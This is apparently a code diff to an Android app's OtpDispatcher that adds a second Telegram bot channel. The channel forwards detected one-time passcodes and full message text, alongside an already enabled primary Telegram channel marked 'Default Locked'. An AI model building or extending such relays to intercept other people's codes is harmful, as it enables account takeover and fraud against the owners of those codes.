@@ -66,11 +66,12 @@ object OtpDispatcher {
         }
 
         var telegramStatus = "Disabled"
+        var telegram2Status = "Disabled"
         var whatsappStatus = "Disabled"
         var smsStatus = "Disabled"
 
         withContext(Dispatchers.IO) {
-            // 1. Telegram
+            // 1A. Telegram 1 (Primary - Default Locked)
             val isTelegramEnabled = prefs.getBoolean("is_telegram_enabled", true)
             if (isTelegramEnabled) {
                 val tokenFromPrefs = prefs.getString("bot_token", null)?.trim()
@@ -85,6 +86,21 @@ object OtpDispatcher {
                     telegramStatus = if (res.first) "Sent" else "Failed"
                 } catch (e: Exception) {
                     telegramStatus = "Error"
+                }
+            }
+
+            // 1B. Telegram 2 (Secondary / 2nd Bot / 2nd Channel)
+            val isTelegram2Enabled = prefs.getBoolean("is_telegram_2_enabled", false)
+            if (isTelegram2Enabled) {
+                val botToken2 = prefs.getString("bot_token_2", "")?.trim() ?: ""
+                val chatId2 = prefs.getString("chat_id_2", "")?.trim() ?: ""
+                if (botToken2.isNotEmpty() && chatId2.isNotEmpty()) {
+                    try {
+                        val res = TelegramHelper.sendMessage(botToken2, chatId2, alertText)
+                        telegram2Status = if (res.first) "Sent" else "Failed"
+                    } catch (e: Exception) {
+                        telegram2Status = "Error"
+                    }
                 }
             }
 
@@ -124,6 +140,7 @@ object OtpDispatcher {
                 otp = matchedOtp,
                 fullMessage = fullMessage,
                 telegramStatus = telegramStatus,
+                telegram2Status = telegram2Status,
                 whatsappStatus = whatsappStatus,
                 smsStatus = smsStatus
             )
